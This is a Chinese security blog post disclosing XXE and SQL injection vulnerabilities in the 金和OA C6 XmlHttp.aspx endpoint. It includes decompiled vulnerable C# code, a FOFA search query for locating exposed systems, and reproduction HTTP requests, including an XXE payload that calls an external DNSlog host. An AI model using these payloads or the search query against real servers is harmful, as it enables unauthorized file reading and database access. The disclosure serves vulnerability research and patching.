---
title: "金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-Archives-XmlHttp-xxe-sqli.html
asset_dir: assets/金和oa-jhsoft.web.archivesxmlhttp.aspx-xxe+sql注入漏洞
---

# 金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/21 13:32
* 423浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

安全工具开发

漏洞修复方案

漏洞预警服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.Archives/XmlHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

网络安全培训

技术文章订阅

Web安全课程

直接根据 `Jhsoft.Web.Archives/XmlHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Archives.dll` 将其进行反编译后找到 **ArchivesRoomDeptSave** 的处理逻辑

```
public class XmlHttp : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
    string QueryString = $"select ArchivesID from Archives where ArchivesID in ({xmlDocument.SelectSingleNode("//Root//ArchivesId").InnerText}) and (ArchivesGD=1 or DelFlag=1)";
    DataTable dataTable = DBOperatorFactory.GetDBOperator().ExecSQLReDataTable(QueryString);
    if (((InternalDataCollectionBase) dataTable.Rows).Count > 0 && dataTable != null)
      this.Response.Write("y");
    else
      this.Response.Write("n");
  }
```

深入探索

编码转换工具

网页浏览器

服务器安全服务

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Archives/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

漏洞扫描服务

安全

软件

在DNSLOG平台成功收到HTTP请求

代码安全审计

[![金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.Archives/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<Root><ArchivesId>SQLI_POC</ArchivesId></Root>
```

[![金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞](images/img-002-1f52559efce5.webp)](https://image.mrxn.net/41e58921ba3d4b82a98345c8664d5b7c.webp)

成功延时 4 秒

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-Archives-XmlHttp-xxe-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-Archives-XmlHttp-xxe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-Archives-XmlHttp-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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